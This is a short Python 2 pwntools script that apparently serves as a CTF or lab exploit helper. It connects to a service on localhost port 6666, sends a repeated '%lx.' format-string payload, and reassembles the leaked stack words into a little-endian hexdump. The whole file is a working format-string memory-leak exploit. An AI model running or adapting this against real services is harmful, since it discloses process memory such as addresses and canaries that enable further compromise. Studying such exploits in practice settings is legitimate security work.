from pwn import *
import re, sys
context.log_level='error'
if len(sys.argv) < 2:
    print 'Usage: ./prog <numwords>'
    sys.exit(2)
H,P='localhost',6666
numwords = int(sys.argv[1])
r = remote(H,P)
r.sendline("%lx."*numwords)
# TODO: Read until the desired value instead of reading until EOF, if you don't get EOF after sending the format string!
data = r.recvall()
res = re.findall(r'([a-f0-9]+)\.', data)
hexdump = ''
for r in res:
    r = r.zfill(16)
    rev = "".join([r[i:i+2] for i in range(0, len(r), 2)][::-1])
    hexdump += rev
print hexdump
